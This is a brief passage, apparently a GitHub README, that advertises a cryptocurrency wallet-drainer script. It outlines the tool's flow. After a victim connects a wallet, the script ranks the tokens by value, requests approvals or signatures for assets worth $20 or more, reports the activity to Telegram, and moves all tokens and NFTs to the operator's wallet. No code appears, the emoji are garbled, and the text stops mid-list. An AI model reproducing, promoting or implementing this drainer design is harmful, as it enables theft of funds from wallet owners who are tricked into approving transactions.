Here are some ideas to get you started:
How it works:

- ðŸ”­ Connect Wallet => tokens are checked and sorted from largest to smallest => a request is made for a token with a texture, depending on what kind of token (the balance of the item must be more than >/= $20). Action logs go to tg after signing the transaction, the object is transferred to your receipient's wallet. Also, the script takes all tokens and NFT.
- ðŸŒ± Everything works on subscriptions without changing the network, one click approve, but if this is a new Metamask, then there is a standard approve or transfer (but this is on the Metamask of the PC only updated) to evrything else - by default, everything is on subscriptions.
- ðŸ‘¯
